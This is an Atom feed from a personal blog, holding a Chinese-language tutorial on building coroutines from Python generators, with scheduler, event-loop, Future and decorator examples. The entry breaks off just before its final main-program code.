<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[thoughts of hsfzxjy]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="http://hsfzxjy.github.io/"/>
  <updated>2016-04-02T15:17:51.136Z</updated>
  <id>http://hsfzxjy.github.io/</id>
  
  <author>
    <name><![CDATA[hsfzxjy]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[Python “黑魔法” 之 Generator Coroutines]]></title>
    <link href="http://hsfzxjy.github.io//python-generator-coroutine/"/>
    <id>http://hsfzxjy.github.io//python-generator-coroutine/</id>
    <published>2016-04-01T16:00:00.000Z</published>
    <updated>2016-04-02T15:17:51.136Z</updated>
    <content type="html"><![CDATA[<h2 id="写在前面">写在前面</h2><blockquote>
<ul>
<li>本文默认读者对 Python 生成器 有一定的了解，不了解者请移步至<a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/0014317799226173f45ce40636141b6abc8424e12b5fb27000" target="_blank" rel="external">生成器 - 廖雪峰的官方网站</a>。</li>
<li>本文基于 Python 3.5.1，文中所有的例子都可在 <a href="https://github.com/hsfzxjy/python-generator-coroutine-examples" target="_blank" rel="external">Github</a> 上获得。</li>
</ul>
</blockquote>
<p>学过 Python 的都知道，Python 里有一个很厉害的概念叫做 生成器（Generators）。一个生成器就像是一个微小的线程，可以随处暂停，也可以随时恢复执行，还可以和代码块外部进行数据交换。恰当使用生成器，可以极大地简化代码逻辑。</p>
<p>也许，你可以熟练地使用生成器完成一些看似不可能的任务，如“无穷斐波那契数列”，并引以为豪，认为所谓的生成器也不过如此——那我可要告诉你：这些都太小儿科了，下面我所要介绍的绝对会让你大开眼界。</p>
<p><strong>生成器 可以实现 协程，你相信吗？</strong></p>
<h2 id="什么是协程">什么是协程</h2><p>在异步编程盛行的今天，也许你已经对 协程（coroutines） 早有耳闻，但却不一定了解它。我们先来看看 <a href="https://en.wikipedia.org/wiki/Coroutine" target="_blank" rel="external">Wikipedia</a> 的定义：</p>
<blockquote>
<p>Coroutines are computer program components that generalize subroutines for nonpreemptive multitasking, by allowing multiple entry points for suspending and resuming execution at certain locations.</p>
</blockquote>
<p>也就是说：协程是一种 <strong>允许在特定位置暂停或恢复的子程序</strong>——这一点和 生成器 相似。但和 生成器 不同的是，协程 可以控制子程序暂停之后代码的走向，而 生成器 仅能被动地将控制权交还给调用者。</p>
<p>协程 是一种很实用的技术。和 多进程 与 多线程 相比，协程 可以只利用一个线程更加轻便地实现 多任务，将任务切换的开销降至最低。和 回调 等其他异步技术相比，协程 维持了正常的代码流程，在保证代码可读性的同时最大化地利用了 阻塞 IO 的空闲时间。它的高效与简洁赢得了开发者们的拥戴。</p>
<h2 id="Python_中的协程">Python 中的协程</h2><p>早先 Python 是没有原生协程支持的，因此在 协程 这个领域出现了百家争鸣的现象。主流的实现由以下两种：</p>
<ul>
<li>用 C 实现协程调度。这一派以 gevent 为代表，在底层实现了协程调度，并将大部分的 阻塞 IO 重写为异步。</li>
<li>用 生成器模拟。这一派以 Tornado 为代表。Tornado 是一个老牌的异步 Web 框架，涵盖了五花八门的异步编程方式，其中包括 协程。本文部分代码借鉴于 Tornado。</li>
</ul>
<p>直至 Python 3.4，Python 第一次将异步编程纳入标准库中（参见 <a href="https://www.python.org/dev/peps/pep-3156/" target="_blank" rel="external">PEP 3156</a>），其中包括了用生成器模拟的 协程。而在 Python 3.5 中，Guido 总算在语法层面上实现了 协程（参见 <a href="https://www.python.org/dev/peps/pep-0492/" target="_blank" rel="external">PEP 0492</a>）。比起 <code>yield</code> 关键字，新关键字 <code>async</code> 和 <code>await</code> 具有更好的可读性。在不久的将来，新的实现将会慢慢统一混乱已久的协程领域。</p>
<p>尽管 生成器协程 已成为了过去时，但它曾经的辉煌却不可磨灭。下面，让我们一起来探索其中的魔法。</p>
<h2 id="一个简单的例子">一个简单的例子</h2><p>假设有两个子程序 <code>main</code> 和 <code>printer</code>。<code>printer</code> 是一个死循环，等待输入、加工并输出结果。<code>main</code> 作为主程序，不时地向 <code>printer</code> 发送数据。    </p>
<p>这应该怎么实现呢？</p>
<p>传统方式中，这几乎不可能在一个线程中实现，因为死循环会阻塞。而协程却能很好地解决这个问题：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printer</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    counter = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        string = (<span class="keyword">yield</span>)</span><br><span class="line">        print(<span class="string">'[&#123;0&#125;] &#123;1&#125;'</span>.format(counter, string))</span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    p = printer()</span><br><span class="line">    next(p)</span><br><span class="line">    p.send(<span class="string">'Hi'</span>)</span><br><span class="line">    p.send(<span class="string">'My name is hsfzxjy.'</span>)</span><br><span class="line">    p.send(<span class="string">'Bye!'</span>)</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">[0]</span> Hi</span><br><span class="line"><span class="comment">[1]</span> My name <span class="keyword">is</span> hsfzxjy.</span><br><span class="line"><span class="comment">[2]</span> Bye!</span><br></pre></td></tr></table></figure>
<p>这其实就是最简单的协程。程序由两个分支组成。主程序通过 <code>send</code> 唤起子程序并传入数据，子程序处理完后，用 <code>yield</code> 将自己挂起，并返回主程序，如此交替进行。</p>
<h2 id="协程调度">协程调度</h2><p>有时，你的手头上会有多个任务，每个任务耗时很长，而你又不想同步处理，而是希望能像多线程一样交替执行。这时，你就需要一个调度器来协调流程了。</p>
<p>作为例子，我们假设有这么一个任务：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span><span class="params">(name, times)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(times):</span><br><span class="line">        print(name, i)</span><br></pre></td></tr></table></figure>
<p>如果你直接执行 <code>task</code>，那它会在遍历 <code>times</code> 次之后才会返回。为了实现我们的目的，我们需要将 <code>task</code> 人为地切割成若干块，以便并行处理：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span><span class="params">(name, times)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(times):</span><br><span class="line">        <span class="keyword">yield</span></span><br><span class="line">        print(name, i)</span><br></pre></td></tr></table></figure>
<p>这里的 <code>yield</code> 没有逻辑意义，仅是作为暂停的标志点。程序流可以在此暂停，也可以在此恢复。而通过实现一个调度器，我们可以完成多个任务的并行处理：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Runner</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, tasks)</span>:</span></span><br><span class="line">        self.tasks = deque(tasks)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.tasks.pop()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> len(self.tasks):</span><br><span class="line">            task = self.next()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                next(task)</span><br><span class="line">            <span class="keyword">except</span> StopIteration:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.tasks.appendleft(task)</span><br></pre></td></tr></table></figure>
<p>这里我们用一个队列（deque）储存任务列表。其中的 <code>run</code> 是一个重要的方法： <strong>它通过轮转队列依次唤起任务，并将已经完成的任务清出队列</strong>，简洁地模拟了任务调度的过程。</p>
<p>而现在，我们只需调用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Runner([</span><br><span class="line">    task(<span class="string">'hsfzxjy'</span>, <span class="number">5</span>),</span><br><span class="line">    task(<span class="string">'Jack'</span>, <span class="number">4</span>),</span><br><span class="line">    task(<span class="string">'Bob'</span>, <span class="number">6</span>)</span><br><span class="line">]).run()</span><br></pre></td></tr></table></figure>
<p>就可以得到预想中的效果了：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Bob <span class="number">0</span></span><br><span class="line">Jack <span class="number">0</span></span><br><span class="line">hsfzxjy <span class="number">0</span></span><br><span class="line">Bob <span class="number">1</span></span><br><span class="line">Jack <span class="number">1</span></span><br><span class="line">hsfzxjy <span class="number">1</span></span><br><span class="line">Bob <span class="number">2</span></span><br><span class="line">Jack <span class="number">2</span></span><br><span class="line">hsfzxjy <span class="number">2</span></span><br><span class="line">Bob <span class="number">3</span></span><br><span class="line">Jack <span class="number">3</span></span><br><span class="line">hsfzxjy <span class="number">3</span></span><br><span class="line">Bob <span class="number">4</span></span><br><span class="line">hsfzxjy <span class="number">4</span></span><br><span class="line">Bob <span class="number">5</span></span><br></pre></td></tr></table></figure>
<p>简直完美！答案和丑陋的多线程别无二样，代码却简单了不止一个数量级。</p>
<h2 id="异步_IO_模拟">异步 IO 模拟</h2><p>你绝对有过这样的烦恼：程序常常被时滞严重的 IO 操作（数据库查询、大文件读取、越过长城拿数据）阻塞，在等待 IO 返回期间，线程就像死了一样，空耗着时间。为此，你不得不用多线程甚至是多进程来解决问题。</p>
<p>而事实上，在等待 IO 的时候，你完全可以做一些与数据无关的操作，最大化地利用时间。Node.js 在这点做得不错——它将一切异步化，压榨性能。只可惜它的异步是基于事件回调机制的，稍有不慎，你就有可能陷入 Callback Hell 的深渊。</p>
<p>而协程并不使用回调，相比之下可读性会好很多。其思路大致如下：</p>
<ul>
<li>维护一个消息队列，用于储存 IO 记录。</li>
<li>协程函数 IO 时，自身挂起，同时向消息队列插入一个记录。</li>
<li>通过轮询或是 epoll 等事件框架，捕获 IO 返回的事件。</li>
<li>从消息队列中取出记录，恢复协程函数。</li>
</ul>
<p>现在假设有这么一个耗时任务：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span><span class="params">(name)</span>:</span></span><br><span class="line">    print(name, <span class="number">1</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    print(name, <span class="number">2</span>)</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    print(name, <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>正常情况下，这个任务执行完需要 3 秒，倘若多个同步任务同步执行，执行时间会成倍增长。而如果利用协程，我们就可以在接近 3 秒的时间内完成多个任务。</p>
<p>首先我们要实现消息队列：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">events_list = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Event</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        self.callback = <span class="keyword">lambda</span>: <span class="keyword">None</span></span><br><span class="line">        events_list.append(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_callback</span><span class="params">(self, callback)</span>:</span></span><br><span class="line">        self.callback = callback</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_ready</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = self._is_ready()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            self.callback()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<p><code>Event</code> 是消息的基类，其在初始化时会将自己放入消息队列 <code>events_list</code> 中。<code>Event</code> 和 调度器 使用回调进行交互。</p>
<p>接着我们要 hack 掉 <code>sleep</code> 函数，这是因为原生的 <code>time.sleep()</code> 会阻塞线程。通过自定义 <code>sleep</code> 我们可以模拟异步延时操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sleep.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> event <span class="keyword">import</span> Event</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SleepEvent</span><span class="params">(Event)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, timeout)</span>:</span></span><br><span class="line">        super(SleepEvent, self).__init__(timeout)</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        self.start_time = time()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_is_ready</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> time() - self.start_time &gt;= self.timeout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleep</span><span class="params">(timeout)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> SleepEvent(timeout)</span><br></pre></td></tr></table></figure>
<p>可以看出：<code>sleep</code> 在调用后就会立即返回，同时一个 <code>SleepEvent</code> 对象会被放入消息队列，经过<code>timeout</code> 秒后执行回调。</p>
<p>再接下来便是协程调度了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># runner.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> event <span class="keyword">import</span> events_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(tasks)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">        _next(task)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> len(events_list):</span><br><span class="line">        <span class="keyword">for</span> event <span class="keyword">in</span> events_list:</span><br><span class="line">            <span class="keyword">if</span> event.is_ready():</span><br><span class="line">                events_list.remove(event)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_next</span><span class="params">(task)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        event = next(task)</span><br><span class="line">        event.set_callback(<span class="keyword">lambda</span>: _next(task)) <span class="comment"># 1</span></span><br><span class="line">    <span class="keyword">except</span> StopIteration:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p><code>run</code> 启动了所有的子程序，并开始消息循环。每遇到一处挂起，调度器自动设置回调，并在回调中重新恢复代码流。“1” 处巧妙地利用闭包保存状态。</p>
<p>最后是主代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sleep <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> runner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span><span class="params">(name)</span>:</span></span><br><span class="line">    print(name, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">yield</span> sleep(<span class="number">1</span>)</span><br><span class="line">    print(name, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">yield</span> sleep(<span class="number">2</span>)</span><br><span class="line">    print(name, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    runner.run((task(<span class="string">'hsfzxjy'</span>), task(<span class="string">'Jack'</span>)))</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hsfzxjy <span class="number">1</span></span><br><span class="line">Jack <span class="number">1</span></span><br><span class="line">hsfzxjy <span class="number">2</span></span><br><span class="line">Jack <span class="number">2</span></span><br><span class="line">hsfzxjy <span class="number">3</span></span><br><span class="line">Jack <span class="number">3</span></span><br><span class="line"><span class="preprocessor"># [Finished in <span class="number">3.0</span>s]</span></span><br></pre></td></tr></table></figure>
<h2 id="协程函数的层级调用">协程函数的层级调用</h2><p>上面的代码有一个不足之处，即协程函数返回的是一个 <code>Event</code> 对象。然而事实上只有直接操纵 IO 的协程函数才有可能接触到这个对象。那么，对于调用了 IO 的函数的调用者，它们应该如何实现呢？</p>
<p>设想如下任务：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">long_add</span><span class="params">(x, y, duration=<span class="number">1</span>)</span>:</span></span><br><span class="line">    <span class="keyword">yield</span> sleep(duration)</span><br><span class="line">    <span class="keyword">return</span> x + y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task</span><span class="params">(duration)</span>:</span></span><br><span class="line">    print(<span class="string">'start:'</span>, time())</span><br><span class="line">    print((<span class="keyword">yield</span> long_add(<span class="number">1</span>, <span class="number">2</span>, duration)))</span><br><span class="line">    print((<span class="keyword">yield</span> long_add(<span class="number">3</span>, <span class="number">4</span>, duration)))</span><br></pre></td></tr></table></figure>
<p><code>long_add</code> 是 IO 的一级调用者，<code>task</code> 调用 <code>long_add</code>，并利用其返回值进行后续操作。</p>
<p>简而言之，我们遇到的问题是：<strong>一个被唤起的协程函数如何唤起它的调用者？</strong></p>
<p>正如在上个例子中，协程函数通过 <code>Event</code> 的回调与调度器交互。同理，我们也可以使用一个类似的对象，在这里我们称其为 <code>Future</code>。</p>
<p><code>Future</code> 保存在被调用者的闭包中，并由被调用者返回。而调用者通过在其上面设置回调函数，实现两个协程函数之间的交互。</p>
<p><code>Future</code> 的代码如下，看起来有点像 <code>Event</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># future.py</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Future</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(Future, self).__init__()</span><br><span class="line">        self.callback = <span class="keyword">lambda</span> *args: <span class="keyword">None</span></span><br><span class="line">        self._done = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_callback</span><span class="params">(self, callback)</span>:</span></span><br><span class="line">        self.callback = callback</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">done</span><span class="params">(self, value=None)</span>:</span></span><br><span class="line">        self._done = <span class="keyword">True</span></span><br><span class="line">        self.callback(value)</span><br></pre></td></tr></table></figure>
<p><code>Future</code> 的回调函数允许接受一个参数作为返回值，以尽可能地模拟一般函数。</p>
<p>但这样一来，协程函数就会有些复杂了。它们不仅要负责唤醒被调用者，还要负责与调用者之间的交互。这会产生许多重复代码。为了 D.R.Y，我们用装饰器封装这一逻辑：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># co.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">from</span> future <span class="keyword">import</span> Future</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_next</span><span class="params">(gen, future, value=None)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            yielded_future = gen.send(value)</span><br><span class="line">        <span class="keyword">except</span> TypeError:</span><br><span class="line">            yielded_future = next(gen)</span><br><span class="line"></span><br><span class="line">        yielded_future.set_callback(<span class="keyword">lambda</span> value: _next(gen, future, value))</span><br><span class="line">    <span class="keyword">except</span> StopIteration <span class="keyword">as</span> e:</span><br><span class="line">        future.done(e.value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coroutine</span><span class="params">(func)</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="decorator">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        future = Future()</span><br><span class="line"></span><br><span class="line">        gen = func(*args, **kwargs)</span><br><span class="line">        _next(gen, future)</span><br><span class="line">        <span class="keyword">return</span> future</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure>
<p>被 <code>coroutine</code> 包装过的生成器成为了一个普通函数，返回一个 <code>Future</code> 对象。<code>_next</code> 为唤醒的核心逻辑，通过一个类似递归的回调设置简洁地实现自我唤醒。当自己执行完时，会将自己闭包内的<code>Future</code>对象标记为<code>done</code>，从而唤醒调用者。</p>
<p>为了适应新变化，<code>sleep</code> 也要做相应的更改：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> event <span class="keyword">import</span> Event</span><br><span class="line"><span class="keyword">from</span> future <span class="keyword">import</span> Future</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SleepEvent</span><span class="params">(Event)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, timeout)</span>:</span></span><br><span class="line">        super(SleepEvent, self).__init__()</span><br><span class="line">        self.start_time = time()</span><br><span class="line">        self.timeout = timeout</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_is_ready</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> time() - self.start_time &gt;= self.timeout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleep</span><span class="params">(timeout)</span>:</span></span><br><span class="line">    future = Future()</span><br><span class="line">    event = SleepEvent(timeout)</span><br><span class="line">    event.set_callback(<span class="keyword">lambda</span>: future.done())</span><br><span class="line">    <span class="keyword">return</span> future</span><br></pre></td></tr></table></figure>
<p><code>sleep</code> 不再返回 <code>Event</code> 对象，而是一致地返回 <code>Future</code>，并作为 <code>Event</code> 和 <code>Future</code> 之间的代理者。</p>
<p>基于以上更改，调度器可以更加简洁——这是因为协程函数能够自我唤醒：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># runner.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> event <span class="keyword">import</span> events_list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> len(events_list):</span><br><span class="line">        <span class="keyword">for</span> event <span class="keyword">in</span> events_list:</span><br><span class="line">            <span class="keyword">if</span> event.is_ready():</span><br><span class="line">                events_list.remove(event)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>主程序：</p>
